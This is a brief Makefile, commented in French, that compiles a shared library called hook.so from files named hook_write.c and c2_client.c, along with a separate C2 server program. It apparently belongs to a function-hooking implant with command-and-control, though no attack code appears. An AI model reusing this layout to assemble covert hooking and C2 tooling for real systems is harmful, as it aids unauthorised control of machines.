CC = gcc
CFLAGS = -Wall -fPIC -shared -ldl

# Fichiers sources et objets
SRCS = src/hook_write.c src/c2_client.c src/utils.c
OBJS = $(SRCS:.c=.o)

# Nom de la librairie partagée
TARGET = hook.so

# Serveur C2
C2_SRCS = src/c2_server.c
C2_OBJS = $(C2_SRCS:.c=.o)
C2_TARGET = c2_server

# Règles principales
all: $(TARGET) $(C2_TARGET)

$(TARGET): $(OBJS)
	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS)

$(C2_TARGET): $(C2_OBJS)
	$(CC) -o $(C2_TARGET) $(C2_OBJS) -lpthread

%.o: %.c
	$(CC) -c -I./include $(CFLAGS) -o $@ $<

clean:
	rm -f $(OBJS) $(TARGET) $(C2_OBJS) $(C2_TARGET)
